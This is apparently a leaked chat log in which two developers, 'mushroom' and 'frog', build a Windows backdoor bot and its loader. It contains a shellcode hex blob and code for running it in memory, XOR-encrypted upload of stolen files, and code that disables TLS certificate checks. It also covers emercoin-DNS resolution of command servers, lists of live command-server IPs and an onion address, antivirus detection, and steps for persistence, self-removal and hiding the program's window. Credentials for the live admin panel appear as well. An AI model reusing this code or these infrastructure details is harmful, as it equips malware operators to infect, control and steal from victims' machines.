@@ -1,0 +1,4133 @@
+2020-06-22T08:48:55 mushroom -> frog
+Had a look at your code. Clarification do you have command 1 considered not blocking?
+
+2020-06-22T08:49:37 mushroom -> frog
+// If at this point in time there is not a blocking command running, but any command other than Reset, it should be ignored
+	if (((tcode >= 10 && tcode <= 13) || tcode == 1) && new_command_code != 14)
+		return;
+
+2020-06-22T08:53:03 frog -> mushroom
+Hi!
+First I made it so that command 1 could be interrupted, and only then I found out that it should be blocking. Left it as non-blocking (just in case, probably won't make it worse).
+
+2020-06-22T08:57:05 mushroom -> frog
+In theory, it won't. Another clarification, if any error occurs during the execution of any command, what do you send to the server?
+
+2020-06-22T09:00:24 frog -> mushroom
+The text of the error message.
+For example:
+send_result(string("could not download file from ") + uri);
+
+2020-06-22T09:00:57 mushroom -> frog
+Also send the GetLastError code.
+
+2020-06-22T09:01:05 mushroom -> frog
+Or just the code.
+
+2020-06-22T09:01:27 mushroom -> frog
+So that you can determine exactly what the error is.
+
+2020-06-22T09:03:17 mushroom -> frog
+If a transmission error occurred, are you still making attempts to send the same?
+
+2020-06-22T09:04:18 frog -> mushroom
+Okay
+
+2020-06-22T09:04:50 frog -> mushroom
+No, haven't done that yet.
+
+2020-06-22T09:06:10 mushroom -> frog
+Will you do it when you finish all the commands?
+
+2020-06-22T09:06:18 mushroom -> frog
+Which ones are left?
+
+2020-06-22T09:08:53 frog -> mushroom
+Terminate Process is left. I did the rest, tested on some of my data, everything seems to work.
+
+2020-06-22T09:09:22 mushroom -> frog
+Is the command to upload the file to the server working?
+
+2020-06-22T09:10:58 frog -> mushroom
+But it turns out error handling needs to be done everywhere (add GetLastError, send process PID, etc.). I've tested the file upload command, the same file is then uploaded from the server as it was sent (hence, everything works)
+
+2020-06-22T09:15:13 mushroom -> frog
+To upload a file to the server, I advise you to make the timeout for the request bigger, because sometimes the connection with the server is slow.
+DWORD timeoutSize = sizeof(timeout);
+wininet.internetSetOption(req, INTERNET_OPTION_RECEIVE_TIMEOUT, &timeout, timeoutSize);
+
+2020-06-22T09:15:39 mushroom -> frog
+8 - 10 minutes timeout.
+
+2020-06-22T09:37:44 mushroom -> frog
+Another clarification. After the processes work to run the file from disk, do you delete these files? Do you randomly generate these file names?
+
+2020-06-22T09:39:58 frog -> mushroom
+Yes, I generate the names randomly (of 10 characters), save them in the temp folder. Then I delete them after the process is finished.
+
+2020-06-22T09:40:26 mushroom -> frog
+OK. Increase the timeout as I wrote above for the request.
+
+2020-06-22T09:40:40 mushroom -> frog
+Uploading a file to the server.
+
+2020-06-22T09:43:48 frog -> mushroom
+Okay.
+
+2020-06-23T09:02:52 mushroom -> frog
+I forgot to ask yesterday. Is your shell code running in the SEH block?
+
+2020-06-23T09:03:24 mushroom -> frog
+Otherwise it will kill the whole program at the slightest error in shell code.
+
+2020-06-23T09:05:29 mushroom -> frog
+Like this:
+__try
+    {
+        (*(VOID(*)())codeAddr)();
+    }
+    __except (EXCEPTION_EXECUTE_HANDLER)
+    {
+        success = FALSE;
+    }
+
+2020-06-23T09:05:57 mushroom -> frog
+__try\__except be sure to wrap
+
+2020-06-23T09:06:11 frog -> mushroom
+Hi
+No. I was thinking the same thing. Tried to wrap it in the try, catch section, but it didn't work.
+Okay, I'll do it that way. Thanks.
+
+2020-06-23T09:06:41 mushroom -> frog
+try\catch does not catch such errors, but SEH does.
+
+2020-06-23T09:07:14 frog -> mushroom
+Do you need to read into the standard channel in this case?
+
+2020-06-23T09:07:32 mushroom -> frog
+No. You don't count him in any way.
+
+2020-06-23T09:07:57 mushroom -> frog
+That's just executing machine instructions.
+
+2020-06-23T09:08:13 mushroom -> frog
+Do you have an example shell code?
+
+2020-06-23T09:09:30 frog -> mushroom
+A simple one I made myself, which corresponds to the commands
+MOV EAX, 128
+RET
+
+2020-06-23T09:10:11 mushroom -> frog
+Here:
+33 C9 64 8B 49 30 8B 49 0C 8B 49 1C 8B 59 08 8B 41 20 8B 09 80 78 0C 33 75 F2 8B EB 03 6D 3C 8B 6D 78 03 EB 8B 45 20 03 C3 33 D2 8B 34 90 03 F3 42 81 3E 47 65 74 50 75 F2 81 7E 04 72 6F 63 41 75 E9 8B 75 24 03 F3 66 8B 14 56 8B 75 1C 03 F3 8B 74 96 FC 03 F3 33 FF 57 68 61 72 79 41 68 4C 69 62 72 68 4C 6F 61 64 54 53 FF D6 33 C9 57 66 B9 33 32 51 68 75 73 65 72 54 FF D0 57 68 6F 78 41 01 FE 4C 24 03 68 61 67 65 42 68 4D 65 73 73 54 50 FF D6 57 68 72 6C 64 21 68 6F 20 57 6F 68 48 65 6C 8B CC 57 57 51 57 FF D0
+
+2020-06-23T09:11:41 mushroom -> frog
+The Hello World window shows, this is 32 bit code. Since it doesn't restore the stack after the call, there will be an error, which __try\__catch should catch. But you will see the Hello World window when you close it and the error will happen.
+
+2020-06-23T09:14:12 mushroom -> frog
+__try\__except I mean.
+
+2020-06-25T13:22:42 mushroom -> frog
+Hi. What's left of the teams at the moment?
+
+2020-06-25T19:39:23 frog -> mushroom
+The Terminate Process command is left. Made exception handling for Shell Code command. I'm also going to make sending LastErrorCode in the near future.
+
+2020-06-26T07:08:30 frog -> mushroom
+The Terminate Process command is left. Made exception handling for Shell Code command. I'm going to do sending LastErrorCode in the near future.
+
+2020-06-26T13:48:25 mushroom -> frog
+Let me know when you finish the bot, I want to compile at my place and see. Also make a utility that outputs to stdout the same bot id as your program generates it, you need it for autotests.
+
+2020-06-29T08:16:53 frog -> mushroom
+Good afternoon.
+Finished the commands. Did the utility as well. Uploaded everything to gitlab.
+
+2020-06-29T09:18:30 mushroom -> frog
+OK. I'll take a look at it. Finish the loader.
+
+2020-06-29T09:18:47 mushroom -> frog
+Fixation in the system.
+
+2020-06-29T09:24:08 frog -> mushroom
+Where can I see an example?
+
+2020-06-29T09:24:41 mushroom -> frog
+I'll send it to you right away.
+
+2020-06-29T09:27:16 mushroom -> frog
+https://send.firefox.com/download/002a7f773739c622/#5liyPOtHqNs6z-JvZbNjCA
+
+2020-06-29T09:27:24 mushroom -> frog
+Password: }]AuYgk<"T+GypuSD
+
+2020-06-29T09:29:08 mushroom -> frog
+And in the ToR there is a link to an article describing the possible ways https://habr.com/ru/post/425177/
+
+2020-06-29T09:30:01 frog -> mushroom
+Thanks
+
+2020-06-29T14:54:55 mushroom -> frog
+Do not commit the binary to the repository. Remove bd7_id.exe. Just send the binary directly to whoever is asking.
+
+2020-06-29T14:55:21 mushroom -> frog
+In an encrypted archive, with encrypted file headers.
+
+2020-06-29T15:12:37 frog -> mushroom
+Done.
+https://send.firefox.com/download/f84edc7610dfa4b1/#C8FTKpKAgfnUl8gMwPN21g
+jkf34~!@##$78tkfolf;=2-34i
+Deleted the binary.
+
+2020-06-29T15:19:01 mushroom -> frog
+OK.
+
+2020-06-29T15:20:53 mushroom -> frog
+Why are there two of them? Id it depend on the bitrate of the program?
+
+2020-06-29T15:26:17 frog -> mushroom
+No, the id's are the same. Thought I might need both (for testing), so I did just in case
+
+2020-06-29T15:26:43 mushroom -> frog
+Got it.
+
+2020-06-29T15:35:37 mushroom -> frog
+Do you have such a fd55ba0a66466663c0f816699197d3778a in your bots ?
+
+2020-06-29T15:36:10 mushroom -> frog
+I replaced your group in the source with my own, and I do not see this bot in mine.
+
+2020-06-29T15:49:37 frog -> mushroom
+There is this
+
+2020-06-29T15:50:43 mushroom -> frog
+Does he have a frog group?
+
+2020-06-29T15:51:00 frog -> mushroom
+Yes
+
+2020-06-29T15:51:43 mushroom -> frog
+Got it. I'll change the id then.
+
+2020-06-30T08:03:03 mushroom -> frog
+Hi. Did you read in the bootloader job how to connect to the server?
+
+2020-06-30T08:38:09 mushroom -> frog
+I see the backdoor is yours.
+
+2020-06-30T08:39:00 mushroom -> frog
+Running the command 0 300, you get 300 seconds waiting in the command and another 300 seconds between commands.
+
+2020-06-30T08:39:58 mushroom -> frog
+Command 0 <time> means to request a command in <second time>, no need to wait another five minutes.
+
+2020-06-30T08:40:13 mushroom -> frog
+It's the same for team 1.
+
+2020-06-30T08:40:42 mushroom -> frog
+But for commands to start processes, you need to ask for a command every 5 minutes.
+
+2020-06-30T08:42:25 mushroom -> frog
+Executed the command to run the script:
+Microsoft Windows [Version 10.0.19041.329]
+(c) Љ®aЇ®a jen Њ ©Єа®b®dv (Microsoft Corporation), 2020. 'bҐ Їa ü § yyyyҐl.
+
+C:\Users\ivana\Projects\others\bd7\bd7>dir
+'® in the form of a bbw®©bw C Τhe way you see it, the way you see it.
+BOOTCAMP
+'ÄîҐ©l®® : 0246-9FF7
+
+‖ Ї Ї ЇЄ C:\Users\ivana\Projects\others\bd7\bd7
+
+2020-06-30T08:42:53 mushroom -> frog
+It ran, but you probably forgot to encode the output in UTF-8.
+
+2020-06-30T08:43:24 mushroom -> frog
+Everything you send to the server should be encoded in UTF-8.
+
+2020-06-30T08:47:18 frog -> mushroom
+Hi. Okay. Tried encoding in UTF-8, but something didn't work then, the server didn't want to accept the response. I'll try again, maybe somewhere wrong.
+About timeouts: just did not understand this point in the ToR.
+
+2020-06-30T08:48:41 mushroom -> frog
+This is only for commands 0 and 1 timeout means to call back to the server after a timeout after the command is executed.
+
+2020-06-30T08:48:57 mushroom -> frog
+0 300 -> call back in 5 minutes
+
+2020-06-30T08:49:17 mushroom -> frog
+1 300 -> call back in 5 minutes after the command is executed.
+
+2020-06-30T08:49:57 mushroom -> frog
+For everyone else who has a timeout (this is the process startup), the timeout is the maximum running time of the process.
+
+2020-06-30T08:50:43 mushroom -> frog
+Who doesn't have a timeout, wait 5 minutes after the command is executed by default.
+
+2020-06-30T08:52:00 mushroom -> frog
+Well and when the process is running, it's not like it's a blocking command, every 5 minutes the command is requested as the default.
+
+2020-06-30T08:54:27 mushroom -> frog
+Does this window for debugging come out all the time with the output?
+
+2020-06-30T08:54:52 frog -> mushroom
+Yes, it's for debugging.
+
+2020-06-30T08:57:40 frog -> mushroom
+When you execute a start command (non-blocking command), send the result, the next command is requested immediately or wait in the loop when 5 minutes expire?
+
+2020-06-30T09:00:29 mushroom -> frog
+Received the command, started the process, sleep for 5 minutes, the process works, if it worked 1 minute, sent the result to the server, 4 minutes left to sleep it turns out, 4 minutes passed, command request.
+
+2020-06-30T09:01:37 mushroom -> frog
+That is, the program sleeps between requests for 5 minutes, regardless of the running process.
+
+2020-06-30T09:02:00 frog -> mushroom
+I see.
+
+2020-06-30T09:02:23 mushroom -> frog
+The only thing you have to do is synchronize the streams.
+
+2020-06-30T09:02:33 mushroom -> frog
+You know, I think you know.
+
+2020-06-30T09:03:16 frog -> mushroom
+Of course
+
+2020-06-30T09:04:05 mushroom -> frog
+Something about the powershell script "cd c:\r\ndir\r\n" no output.
+
+2020-06-30T09:04:29 mushroom -> frog
+That's what I was running without the file.
+
+2020-06-30T09:04:35 mushroom -> frog
+Check.
+
+2020-06-30T09:05:30 mushroom -> frog
+Nah, it works.
+
+2020-06-30T09:06:13 mushroom -> frog
+I didn't close the debug window. The output is sent to the server after it.
+
+2020-06-30T09:06:49 mushroom -> frog
+Files if run with a download to disk in temp saved?
+
+2020-06-30T09:07:00 frog -> mushroom
+Right
+
+2020-06-30T09:07:32 frog -> mushroom
+The debugging window shows what is being sent to the server.
+
+2020-06-30T09:08:24 mushroom -> frog
+Output the names of these files for debugging, so you can check in temp that they are deleted after they have worked.
+
+2020-06-30T09:12:11 mushroom -> frog
+And output for debugging in more detail, so that the tester will send you a log when errors occur, and you will quickly find the error. Output addresses where you connect exactly need to do.
+
+2020-06-30T09:12:55 frog -> mushroom
+And output for debugging more details, so that the tester will send you a log when errors occur, and you will quickly find the error. Output addresses where you connect exactly need to do.
+
+2020-06-30T09:14:02 mushroom -> frog
+And output for debugging in more detail, so that the tester will send you a log when errors occur, and you will quickly find the error. Output addresses where you connect exactly need to do.
+
+2020-06-30T09:15:51 frog -> mushroom
+Http addresses?
+And do the debug output in Std Output?
+
+2020-06-30T09:16:27 mushroom -> frog
+http addresses, debug output, that's what you have debug_printf
+
+2020-06-30T09:17:07 mushroom -> frog
+So that debug_printf output can be disabled completely through a macro.
+
+2020-06-30T09:17:27 mushroom -> frog
+Did booza give you for the output of the debug file?
+
+2020-06-30T09:17:51 frog -> mushroom
+No
+
+2020-06-30T09:18:49 mushroom -> frog
+did you write debug_printf yourself?
+
+2020-06-30T09:19:11 mushroom -> frog
+Leave them I'll send them to you now.
+
+2020-06-30T09:20:53 mushroom -> frog
+https://send.firefox.com/download/f61414768ac8ffad/#0qIz2TZulK3-7rDckHyoIA
+
+2020-06-30T09:20:58 mushroom -> frog
+Password: 123
+
+2020-06-30T09:21:54 mushroom -> frog
+Connection?
+
+2020-06-30T09:24:40 frog -> mushroom
+Here
+
+2020-06-30T09:24:46 mushroom -> frog
+Did you get it?
+
+2020-06-30T09:24:51 frog -> mushroom
+Yes
+
+2020-06-30T09:25:05 mushroom -> frog
+debug_printf("Text")
+
+2020-06-30T09:25:21 mushroom -> frog
+The macro turns it off completely if needed.
+
+2020-06-30T09:25:45 mushroom -> frog
+In the file tdebug.h
+
+2020-06-30T09:25:55 mushroom -> frog
+See
+
+2020-06-30T09:26:16 mushroom -> frog
+There's output to console, to file, to debug output.
+
+2020-06-30T09:27:10 mushroom -> frog
+RELEASE_NO_LOGS macro disables all output via debug_printf
+
+2020-06-30T09:28:38 mushroom -> frog
+LOG_TO_FILE macro output to file is the same as output to console, works if RELEASE_NO_LOGS macro is not specified.
+
+2020-06-30T09:29:06 mushroom -> frog
+You'll figure it out, you'll change what you need to.
+
+2020-06-30T09:29:44 mushroom -> frog
+The project is now Debug x86\x64, Release x86\x64.
+
+2020-06-30T09:30:24 mushroom -> frog
+You should also add Release_nologs x86\x64 to the solution, and disable all debug output there.
+
+2020-06-30T09:30:55 mushroom -> frog
+And in Release x86\x64 make output to console and file.
+
+2020-06-30T09:31:26 mushroom -> frog
+Did you get it?
+
+2020-06-30T09:31:33 frog -> mushroom
+Right
+
+2020-06-30T09:32:49 mushroom -> frog
+When you make the corrections write everything down. Then I'll tell you how to obfuscate WinApi calls.
+
+2020-06-30T09:34:06 frog -> mushroom
+Shouldn't you have obfuscated via GetApi.h?
+
+2020-06-30T09:34:33 mushroom -> frog
+You can do it that way. Only it doesn't have all the functions that you have in your code.
+
+2020-06-30T09:35:38 mushroom -> frog
+I'll show you another option, and then you decide how you want it.
+
+2020-06-30T10:06:37 mushroom -> frog
+The 5 mb file couldn't upload to the server with your backdoor.
+
+2020-06-30T10:06:54 mushroom -> frog
+Check.
+
+2020-06-30T10:08:33 frog -> mushroom
+The 5 mb file couldn't upload to the server with your backdoor.
+
+2020-06-30T10:08:33 frog -> mushroom
+Check.
+
+2020-06-30T10:14:56 mushroom -> frog
+Is there a connection?
+
+2020-06-30T10:16:27 mushroom -> frog
+The system info command gave the wrong ip 192.168.56.1 192.168.1.42 and the external ip.
+
+2020-06-30T10:16:28 mushroom -> frog
+The 5 mb file couldn't upload to the server with your backdoor.
+
+2020-07-02T07:53:14 frog -> mushroom
+Hi!
+The CHTTP::postBinary function does the sending of the file to the server. I don't know what I'm doing wrong with it. Increased the timeout to 10 minutes.
+
+2020-07-02T08:06:50 mushroom -> frog
+Hi. I'll take a look at it now.
+
+2020-07-02T08:12:35 mushroom -> frog
+Do you encrypt the file before sending it?
+
+2020-07-02T08:12:48 mushroom -> frog
+There is no encryption in postBinary.
+
+2020-07-02T08:13:26 frog -> mushroom
+In CHTTP::post encryption
+
+2020-07-02T08:14:36 mushroom -> frog
+Content-Length: %d d you don't have to write in the header, wininet will insert it itself.
+
+2020-07-02T08:16:35 mushroom -> frog
+CHTTP::post has no encryption either.
+
+2020-07-02T08:17:28 frog -> mushroom
+bool CHTTP::post(char* id, const PBYTE data, DWORD data_size)
+{
+    //Send result to the server
+    PBYTE xor_data = (PBYTE)pHeapAlloc(GetProcessHeap(), 0, data_size);
+
+    xor_crypt(data, data_size, id, xor_data);
+
+2020-07-02T08:17:51 frog -> mushroom
+xor_crypt - encryption.
+
+2020-07-02T08:18:27 mushroom -> frog
+Here's what I have:
+bool CHTTP::post(const char* objectName, const PBYTE body, DWORD bodyLength, PBYTE* data, DWORD* dataSize)
+{
+    if (data != nullptr) *data = nullptr;
+    if (dataSize != nullptr) *dataSize = 0;
+
+    if (hHttpSession == NULL)
+        return false;
+    HINTERNET hHttpRequest = HttpOpenRequestA(
+        hHttpSession, "POST", objectName, "1.1,
+        nullptr, nullptr, INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_COOKIES, 0);
+
+    if (hHttpRequest == NULL)
+        return false;
+
+    char szHeaders[] = "Content-Type: application/x-www-form-urlencoded\r\nCookie: group=" GROUP;
+    if (!HttpSendRequestA(hHttpRequest, szHeaders, strlen(szHeaders), body, bodyLength))
+    {
+        InternetCloseHandle(hHttpRequest);
+        return false;
+    }
+
+    // check status code
+    if (!okStatus(hHttpRequest))
+    {
+        InternetCloseHandle(hHttpRequest);
+        return false;
+    }
+
+    read(hHttpRequest, data, dataSize);
+
+    InternetCloseHandle(hHttpRequest);
+    return true;
+}
+
+2020-07-02T08:19:22 mushroom -> frog
+Found an overloaded method. There is encryption there.
+
+2020-07-02T08:27:27 mushroom -> frog
+Maybe Content-Length: %d in the header. Try without it, wininet calculates it by itself.
+
+2020-07-02T08:28:21 mushroom -> frog
+I'll check my server, maybe it's a server jam, later.
+
+2020-07-02T09:39:13 mushroom -> frog
+I checked with myself. My file is not being sent either. It's a bug on the server, it's happened before. Put that command aside for now.
+
+2020-07-02T09:43:24 frog -> mushroom
+I checked with myself. My file is not being sent either. It's a bug on the server, it's happened before. Put that command aside for now.
+
+2020-07-02T09:44:23 mushroom -> frog
+I checked with myself. My file is not being sent either. It's a bug on the server, it's happened before. Put that command aside for now.
+
+2020-07-02T09:44:49 frog -> mushroom
+Okay. But it took the nth try to send a 1.75 MB picture.
+
+2020-07-02T09:45:24 mushroom -> frog
+Yes. The server accepts small files.
+
+2020-07-02T09:45:39 mushroom -> frog
+5 mb is not accepted.
+
+2020-07-02T09:46:06 mushroom -> frog
+It should take up to 10 mb inclusive.
+
+2020-07-02T09:46:47 mushroom -> frog
+The system info command gave the wrong ip 192.168.56.1 192.168.1.42, which is the external ip. That was the last time I looked. Is there a change?
+
+2020-07-02T09:48:13 frog -> mushroom
+Made an external ip address request with "https://myexternalip.com/raw".
+
+2020-07-02T09:48:30 mushroom -> frog
+Sort of.
+
+2020-07-02T09:52:52 mushroom -> frog
+Does suicide send anything to the server?
+
+2020-07-02T09:53:11 mushroom -> frog
+You have to send OK and shut down.
+
+2020-07-02T09:53:55 mushroom -> frog
+Didn't send anything last time, that's why this command is pending in the admin.
+
+2020-07-02T09:58:51 mushroom -> frog
+Now running command 1 came up with ip 192.168.56.1, 192.168.1.42.
+
+2020-07-02T09:59:03 mushroom -> frog
+Not external again.
+
+2020-07-02T09:59:45 frog -> mushroom
+Okay, I will.
+If you need, you can do in the process function in the loop
+command = "14";
+I also made encoding from OEM to ANSI content of standard threads. Now everything is readable on server.
+I'll check now, maybe I haven't uploaded it to gitlab yet.
+
+2020-07-02T10:00:22 mushroom -> frog
+And the system is defined as Win 8, but I have Win 10.
+
+2020-07-02T10:00:49 mushroom -> frog
+In the field where antiviruses
+Standart Output
+Standart Error
+ERROR.
+Description: Incorrect namespace
+
+2020-07-02T10:02:26 mushroom -> frog
+Tell me when you download it. Is that how it's done?
+
+2020-07-02T10:03:00 frog -> mushroom
+You also need to put debug_printf everywhere.
+
+2020-07-02T10:04:23 mushroom -> frog
+Then tell them to make you an account in the working admin to test there.
+
+2020-07-02T10:07:34 frog -> mushroom
+This is how I recognize the antivirus:
+run("wmic /namespace:\\root\SecurityCenter path AntivirusProduct get displayName, versionNumber /format:list");
+I'll do a shutdown command, debug (debug_printf) and then upload to gitlab
+
+2020-07-02T10:24:08 mushroom -> frog
+Also, you just take the server address now, and in the TOR you need to get it. First go through the list of simple addresses, then through the list of emercoin addresses, then through the list of generated addresses. This is the same for the loader and the bot. When the account is made for you on the working admin, I'll give you those lists.
+
+2020-07-02T10:24:50 mushroom -> frog
+You didn't do an address retrieval from the emercoin network, did you?
+
+2020-07-02T10:25:46 frog -> mushroom
+No. I haven't done it yet.
+
+2020-07-02T10:26:10 mushroom -> frog
+Did Buza give you an example?
+
+2020-07-02T10:27:42 frog -> mushroom
+There is a module resolve_emercoin.h among those files that Buza gave
+
+2020-07-02T10:29:01 mushroom -> frog
+So there is. There is another way, it's easier, I'll send it now, it will be the main one, and resolve_emercoin is a spare one.
+
+2020-07-02T10:30:44 mushroom -> frog
+BOOL emercoinResolveDns(PCSTR emercoinAddress, PSTR resolvedAddress)
+{
+	PBYTE resp = NULL;
+	SIZE_T respSize = 0;
+	if (downloadBuffer(_TSTR(TEXT("https://api.opennicproject.org/geoip/?bare&ipv=4")), &resp,
+		&respSize))
+	{
+		IP4_ARRAY dnsServersArray = { 0 };
+		dnsServersArray.AddrCount = 1;
+
+		PDNS_RECORD dnsRecord = NULL;
+		DNS_STATUS status;
+
+		PSTR addrs = (PSTR)resp;
+		PSTR context = NULL;
+		while (*addrs != '\0')
+		{
+			IN_ADDR addr = { 0 };
+			PSTR token = strtok_s(addrs, "\n", &context);
+			addrs = context;
+
+			if (pinet_pton(AF_INET, token, &addr))
+			{
+				CopyMemory(dnsServersArray.AddrArray, &addr, sizeof(IN_ADDR));
+				status = dnsapi.dnsQuery_A(emercoinAddress, DNS_TYPE_A, DNS_QUERY_BYPASS_CACHE,
+					&dnsServersArray, &dnsRecord, NULL);
+				if (0 == status)
+				{
+					CHAR addrStr[17];
+					pinet_ntop(AF_INET, (PVOID)&dnsRecord->Data.A.IpAddress, addrStr,
+						sizeof(addrStr));
+					lstrcpyA(resolvedAddress, addrStr);
+
+					dnsapi.dnsFree((PVOID)dnsRecord, DnsFreeRecordList);
+					HeapFree(GetProcessHeap(), 0, resp);
+					return TRUE;
+				}
+
+				dnsapi.dnsFree((PVOID)dnsRecord, DnsFreeRecordList);
+			}
+		}
+
+		HeapFree(GetProcessHeap(), 0, resp);
+	}
+
+	return FALSE;
+}
+
+2020-07-02T10:31:51 mushroom -> frog
+downloadBuffer(_TSTR(TEXT("https://api.opennicproject.org/geoip/?bare&ipv=4")) is just a GET request, gets a list of addresses.
+
+2020-07-02T10:33:22 mushroom -> frog
+In general, the address is obtained through a dns query.
+
+2020-07-02T10:38:17 mushroom -> frog
+Here is thegame.bazar address for training, it should get 34.222.222.126.
+
+2020-07-02T10:39:59 mushroom -> frog
+Every byte of the address has to be decrypted by xor 254 after emercoinResolveDns. And then you get 34.222.222.126.
+
+2020-07-02T10:40:11 mushroom -> frog
+It's a left address, nothing was sent to it.
+
+2020-07-02T10:40:22 mushroom -> frog
+If you have any questions write.
+
+2020-07-02T10:41:14 mushroom -> frog
+Address byte means <byte>.<byte>.<byte>.<byte>.
+
+2020-07-03T10:45:04 mushroom -> frog
+Hi.
+
+2020-07-03T10:45:13 mushroom -> frog
+Login: b16
+
+2020-07-03T10:45:27 mushroom -> frog
+Password: ZYI%bLmcEAbV1sqQ
+
+2020-07-03T10:45:48 mushroom -> frog
+This is a battle server.
+
+2020-07-03T10:46:13 mushroom -> frog
+lowers
+85.204.116.243
+86.104.194.108
+89.32.41.184
+192.99.255.32
+66.70.218.37
+107.173.114.117
+
+2020-07-03T10:46:24 mushroom -> frog
+bot
+185.180.198.99
+86.104.194.109
+45.148.120.173
+185.99.2.221
+5.1.81.68
+86.104.194.110
+
+2020-07-03T10:46:43 mushroom -> frog
+Address lists.
+
+2020-07-03T10:47:13 mushroom -> frog
+Make a connection to the server as described in the TOR for the loafer.
+
+2020-07-03T10:49:09 mushroom -> frog
+3 lists, the first list is pure addresses, I wrote them above, the second list is emercoin addresses, you can make them up like bestgame.bazaar, the third list is generated automatically based on the date (described in the ToR for the loader).
+
+2020-07-03T10:49:54 mushroom -> frog
+This connection is the same for bot and loader.
+
+2020-07-03T10:52:56 mushroom -> frog
+And do as you want, so you do not get confused when you connect to the test server, and when to combat. I, for example, if the macro _DEBUG set connection to the test, if not - to combat. Release_nologs should be a windows program, not a console (/SUBSYSTEM:WINDOWS), how do you have it now?
+
+2020-07-03T10:56:09 frog -> mushroom
+Hi!
+Release_nologs is still console.
+
+2020-07-03T10:56:22 mushroom -> frog
+Your group is on the battle server seven, don't confuse it with the group you have on the test server. For combat seven, for test frog.
+
+2020-07-03T10:56:57 mushroom -> frog
+Change Release_nologs to a windows program so the user doesn't see anything at all.
+
+2020-07-03T10:57:37 frog -> mushroom
+Okay. What is the http address of the battle server?
+
+2020-07-03T10:57:57 mushroom -> frog
+https://scrytnuuszglaugg.onion
+
+2020-07-06T11:18:46 frog -> mushroom
+Hi.
+Is it possible to find out the date and SID on the server without querying the command itself (/%id%/2)? Is there a separate command for this?
+Should the date be signed locally?
+Is server search done once on startup or is there a different algorithm?
+
+2020-07-06T11:20:41 mushroom -> frog
+Hi. The server is searched on startup, and if there is some kind of communication error, again search through the lists.
+
+2020-07-06T11:22:21 mushroom -> frog
+To get the SID without requesting a command, request GET /<id>/4
+
+2020-07-06T11:23:14 mushroom -> frog
+The date signed is the one the server sends in the header.
+
+2020-07-06T11:25:44 mushroom -> frog
+The server will send a date like 2020-07-06 09:00:10 only the date should be checked, the time should be discarded.
+
+2020-07-06T11:26:34 mushroom -> frog
+If you could not find a valid command server in 3 hours, you should either terminate or remove yourself from the system (determined by your build settings).
+
+2020-07-06T11:27:06 mushroom -> frog
+The full connection algorithm look in the ToR for the loader, it is the same for the loader and for the bot.
+
+2020-07-06T11:28:18 mushroom -> frog
+If a transmission error occurs, several more attempts to send a request, no success, reconnect.
+
+2020-07-06T11:28:57 mushroom -> frog
+Failed to reconnect in 3 hours, exit.
+
+2020-07-06T11:34:30 frog -> mushroom
+Use port 80?
+
+2020-07-06T11:35:53 mushroom -> frog
+https always use on the live server, on the test server whatever you want.
+
+2020-07-06T11:39:32 mushroom -> frog
+For https requests, after the HttpOpenRequest function, you need to set flags to ignore certificate errors, because they are self-written on the server.
+
+2020-07-06T11:39:44 mushroom -> frog
+DWORD flags = 0;
+    DWORD flagsSize = sizeof(flags);
+    wininet.internetQueryOption(req, INTERNET_OPTION_SECURITY_FLAGS, &flags, &flagsSize);
+    if (isSecure)
+    {
+        flags |= SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
+        flags |= SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
+        flags |= SECURITY_FLAG_IGNORE_UNKNOWN_CA;
+        flags |= SECURITY_FLAG_IGNORE_REDIRECT_TO_HTTPS;
+        flags |= SECURITY_FLAG_IGNORE_REVOCATION;
+    }
+    else
+        flags |= SECURITY_FLAG_IGNORE_REDIRECT_TO_HTTP;
+    wininet.internetSetOption(req, INTERNET_OPTION_SECURITY_FLAGS, &flags, flagsSize);
+
+2020-07-06T11:39:49 mushroom -> frog
+like this
+
+2020-07-06T11:42:13 frog -> mushroom
+isSecure is "true" if port 443?
+
+2020-07-06T11:46:01 mushroom -> frog
+Yes if https connection, can be theoretically https connection not for port 443. The default is 443.
+
+2020-07-06T11:46:55 mushroom -> frog
+Don't forget to pass flag during request opening if you have https connection
+HINTERNET req = wininet.httpOpenRequest(connection, method, path, _TSTR(TEXT("1.1")), NULL,
+        NULL, (isSecure ? INTERNET_FLAG_SECURE : 0) | INTERNET_FLAG_NO_COOKIES, 0);
+
+2020-07-06T11:46:58 mushroom -> frog
+like this
+
+2020-07-06T11:47:49 frog -> mushroom
+Okay. Thank you!
+
+2020-07-06T11:47:54 mushroom -> frog
+HINTERNET req = wininet.httpOpenRequest(connection, method, path, _TSTR(TEXT("1.1")), NULL,
+       NULL, (isSecure ? INTERNET_FLAG_SECURE : 0) | INTERNET_FLAG_NO_COOKIES, 0);
+DWORD flagsSize = sizeof(flags);
+   wininet.internetQueryOption(req, INTERNET_OPTION_SECURITY_FLAGS, &flags, &flagsSize);
+   if (isSecure)
+   {
+       flags |= SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
+       flags |= SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
+       flags |= SECURITY_FLAG_IGNORE_UNKNOWN_CA;
+       flags |= SECURITY_FLAG_IGNORE_REDIRECT_TO_HTTPS;
+       flags |= SECURITY_FLAG_IGNORE_REVOCATION;
+   }
+   else
+       flags |= SECURITY_FLAG_IGNORE_REDIRECT_TO_HTTP;
+   wininet.internetSetOption(req, INTERNET_OPTION_SECURITY_FLAGS, &flags, flagsSize);
+
+2020-07-06T11:48:06 mushroom -> frog
+Like this, and then send a request.
+
+2020-07-06T13:03:28 frog -> mushroom
+If the date on the server is not the same as the local date, then skip the server?
+
+2020-07-06T13:04:28 mushroom -> frog
+If the signature does not match, or the date (without time) does not match the local, look for another server. That's what it says in the ToR.
+
+2020-07-06T13:38:19 frog -> mushroom
+How do I check if an emercoin address I made up myself is busy?
+
+2020-07-06T13:39:12 mushroom -> frog
+The one you came up with yourself, try to get it. Through dns request as I wrote or through resolve_emercoin.
+
+2020-07-10T09:23:42 frog -> mushroom
+Hi, I have a few questions.
+When a domain name is generated based on the current date, a sequence of characters is obtained (according to the algorithm in the TK, there is a function for this). How to convert this sequence to an IP address?
+
+How do I reconnect? The TOR says:
+"If there was a transmission timeout within three attempts, the bot doubles the sending intervals, up to an interval of 30 minutes."
+How long (or how many attempts) to try to connect to a particular IP address and when to start looking for another server?
+
+Now only HTTP-code 200 is considered successful. The TOR says about HTTP-codes 40*, 50* too. And what should I do if I can't send a file?
+
+2020-07-10T09:30:10 mushroom -> frog
+Add .bazaar to this sequence
+
+2020-07-10T09:30:17 mushroom -> frog
+This is the address of emercoin
+
+2020-07-10T09:34:34 mushroom -> frog
